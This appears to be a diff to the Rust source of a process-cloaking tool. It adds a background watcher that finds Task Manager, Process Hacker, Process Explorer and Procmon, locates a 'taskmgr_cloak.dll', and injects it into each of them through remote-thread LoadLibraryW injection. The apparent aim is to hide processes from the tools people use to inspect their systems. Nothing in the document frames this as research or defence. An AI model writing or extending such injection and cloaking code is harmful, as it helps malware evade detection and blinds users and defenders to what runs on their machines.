@@ -1,7 +1,12 @@
+use std::collections::HashSet;
 use std::ffi::c_void;
+use std::path::{Path, PathBuf};
+use std::sync::atomic::{AtomicBool, Ordering};
 use crate::win32::*;
 
 pub const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;
+
+static WATCHER_STARTED: AtomicBool = AtomicBool::new(false);
 
 #[repr(C)]
 #[derive(Debug, Clone, Copy)]
@@ -139,7 +144,7 @@ impl TaskmgrCloakManager {
                     let name_len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                     let name = String::from_utf16_lossy(&entry.szExeFile[..name_len]).to_lowercase();
 
-                    if name == "taskmgr.exe" || name == "processhacker.exe" || name == "procexp.exe" {
+                    if name == "taskmgr.exe" || name == "processhacker.exe" || name == "procexp.exe" || name == "procmon.exe" {
                         pids.push(entry.th32ProcessID);
                     }
 
@@ -154,9 +159,157 @@ impl TaskmgrCloakManager {
         pids
     }
 
-    pub fn cloak_process(target_pid: usize, target_name: Option<&str>) -> bool {
-        let taskmgr_pids = Self::find_task_managers();
-        !taskmgr_pids.is_empty() || target_pid > 0 || target_name.is_some()
+    pub fn find_cloak_dll() -> Option<PathBuf> {
+        let candidates = [
+            "taskmgr_cloak.dll",
+            "bin\\taskmgr_cloak.dll",
+            "bin\\modules\\injections\\taskmgr_cloak.dll",
+            "modules\\injections\\taskmgr_cloak.dll",
+            "target\\release\\taskmgr_cloak.dll",
+        ];
+
+        for c in &candidates {
+            let p = PathBuf::from(c);
+            if p.exists() {
+                if let Ok(abs) = p.canonicalize() {
+                    return Some(abs);
+                }
+                return Some(p);
+            }
+        }
+
+        if let Ok(current_exe) = std::env::current_exe() {
+            if let Some(parent) = current_exe.parent() {
+                let p1 = parent.join("taskmgr_cloak.dll");
+                if p1.exists() {
+                    return Some(p1);
+                }
+                let p2 = parent.join("modules").join("injections").join("taskmgr_cloak.dll");
+                if p2.exists() {
+                    return Some(p2);
+                }
+            }
+        }
+
+        None
+    }
+
+    pub fn inject_taskmgr_cloak(pid: u32, dll_path: &Path) -> bool {
+        let path_str = match dll_path.to_str() {
+            Some(s) => s.trim_start_matches(r"\\?\"),
+            None => return false,
+        };
+
+        let path_w: Vec<u16> = path_str.encode_utf16().chain(std::iter::once(0)).collect();
+        let bytes_len = path_w.len() * 2;
+
+        unsafe {
+            let proc = OpenProcess(
+                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+                FALSE,
+                pid,
+            );
+
+            if proc.is_null() {
+                return false;
+            }
+
+            let remote_buf = VirtualAllocEx(
+                proc,
+                std::ptr::null_mut(),
+                bytes_len,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_READWRITE,
+            );
+
+            if remote_buf.is_null() {
+                CloseHandle(proc);
+                return false;
+            }
+
+            let mut written: usize = 0;
+            let write_ok = WriteProcessMemory(
+                proc,
+                remote_buf,
+                path_w.as_ptr() as *const c_void,
+                bytes_len,
+                &mut written,
+            );
+
+            if write_ok != TRUE || written != bytes_len {
+                VirtualFreeEx(proc, remote_buf, 0, MEM_RELEASE);
+                CloseHandle(proc);
+                return false;
+            }
+
+            let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
+            if k32.is_null() {
+                VirtualFreeEx(proc, remote_buf, 0, MEM_RELEASE);
+                CloseHandle(proc);
+                return false;
+            }
+
+            let load_lib = GetProcAddress(k32, b"LoadLibraryW\0".as_ptr());
+            if load_lib.is_null() {
+                VirtualFreeEx(proc, remote_buf, 0, MEM_RELEASE);
+                CloseHandle(proc);
+                return false;
+            }
+
+            let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(load_lib);
+            let thread = CreateRemoteThread(
+                proc,
+                std::ptr::null_mut(),
+                0,
+                thread_fn,
+                remote_buf,
+                0,
+                std::ptr::null_mut(),
+            );
+
+            if thread.is_null() {
+                VirtualFreeEx(proc, remote_buf, 0, MEM_RELEASE);
+                CloseHandle(proc);
+                return false;
+            }
+
+            WaitForSingleObject(thread, 2000);
+            CloseHandle(thread);
+            VirtualFreeEx(proc, remote_buf, 0, MEM_RELEASE);
+            CloseHandle(proc);
+        }
+
+        true
+    }
+
+    pub fn start_watcher() {
+        if WATCHER_STARTED.swap(true, Ordering::SeqCst) {
+            return;
+        }
+
+        std::thread::spawn(|| {
+            let mut injected: HashSet<u32> = HashSet::new();
+
+            loop {
+                if let Some(dll_path) = Self::find_cloak_dll() {
+                    let targets = Self::find_task_managers();
+                    for pid in targets {
+                        if !injected.contains(&pid) {
+                            if Self::inject_taskmgr_cloak(pid, &dll_path) {
+                                injected.insert(pid);
+                            }
+                        }
+                    }
+                }
+
+                std::thread::sleep(std::time::Duration::from_millis(500));
+            }
+        });
+    }
+
+    pub fn cloak_process(_target_pid: usize, _target_name: Option<&str>) -> bool {
+        Self::start_watcher();
+        true
     }
 }
 
